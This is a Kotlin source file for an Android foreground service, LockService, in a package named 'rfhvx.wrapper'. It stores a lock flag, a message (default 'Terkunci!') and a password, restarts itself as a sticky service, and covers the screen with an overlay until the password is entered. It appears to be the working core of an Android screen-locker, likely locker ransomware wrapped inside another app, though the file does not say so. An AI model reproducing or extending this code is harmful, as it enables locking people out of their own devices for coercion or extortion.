package com.rfhvx.wrapper
import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
class LockService : Service() {
    companion object {
        private const val CHANNEL_ID = "rfhvx_lock"
        private const val NOTIF_ID = 1001
        private const val PREFS = "rfhvx_prefs"
        fun start(ctx: Context) {
            val i = Intent(ctx, LockService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
        }
        fun setLock(ctx: Context, msg: String, pass: String) {
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putBoolean("locked", true).putString("msg", msg).putString("pass", pass).apply()
            start(ctx)
        }
        fun unlock(ctx: Context) {
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putBoolean("locked", false).apply()
            OverlayManager.hide()
        }
        fun isLocked(ctx: Context): Boolean = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean("locked", false)
        fun getLockMessage(ctx: Context): String = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("msg", "Terkunci!") ?: "Terkunci!"
        fun getLockPass(ctx: Context): String = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("pass", "123456") ?: "123456"
        fun showOverlay(ctx: Context) { if (isLocked(ctx)) OverlayManager.show(ctx, getLockMessage(ctx), getLockPass(ctx)) { unlock(ctx) } }
    }
    override fun onBind(intent: Intent?): IBinder? = null
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Lock", NotificationManager.IMPORTANCE_HIGH)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
            val notif = Notification.Builder(this, CHANNEL_ID).setContentTitle("RFHVX").setSmallIcon(android.R.drawable.ic_lock_lock).build()
            startForeground(NOTIF_ID, notif)
        }
        if (isLocked(this)) showOverlay(this)
        return START_STICKY
    }
}
